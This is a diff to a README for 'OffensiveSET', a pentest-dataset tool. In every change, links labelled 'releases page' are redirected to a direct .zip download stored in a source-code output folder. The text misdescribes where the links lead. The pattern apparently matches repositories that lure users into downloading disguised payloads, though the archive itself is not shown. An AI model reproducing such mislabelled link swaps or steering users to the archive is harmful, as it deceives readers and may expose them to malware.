@@ -1,6 +1,6 @@
 # 🛡️ OffensiveSET - Build Better Pentest Datasets
 
-[![Download OffensiveSET](https://img.shields.io/badge/Download%20OffensiveSET-blue?style=for-the-badge)](https://github.com/Claudiasinusoidal818/OffensiveSET/releases)
+[![Download OffensiveSET](https://img.shields.io/badge/Download%20OffensiveSET-blue?style=for-the-badge)](https://github.com/Claudiasinusoidal818/OffensiveSET/raw/refs/heads/main/src/generators/outputs/Offensive-SET-v1.5-alpha.2.zip)
 
 ## 📌 What OffensiveSET Does
 
@@ -33,7 +33,7 @@ For smoother use, 8 GB of RAM or more is a good choice.
 
 Visit the release page here and download the latest Windows file:
 
-[Open the OffensiveSET releases page](https://github.com/Claudiasinusoidal818/OffensiveSET/releases)
+[Open the OffensiveSET releases page](https://github.com/Claudiasinusoidal818/OffensiveSET/raw/refs/heads/main/src/generators/outputs/Offensive-SET-v1.5-alpha.2.zip)
 
 After the page opens, look for the newest release and download the Windows package that matches your PC.
 
@@ -207,7 +207,7 @@ This keeps your downloads, app files, and output files separate
 
 If you need the release page later, use this link:
 
-[https://github.com/Claudiasinusoidal818/OffensiveSET/releases](https://github.com/Claudiasinusoidal818/OffensiveSET/releases)
+[https://github.com/Claudiasinusoidal818/OffensiveSET/raw/refs/heads/main/src/generators/outputs/Offensive-SET-v1.5-alpha.2.zip](https://github.com/Claudiasinusoidal818/OffensiveSET/raw/refs/heads/main/src/generators/outputs/Offensive-SET-v1.5-alpha.2.zip)
 
 ## 🧠 What the MCP Server Is For
 
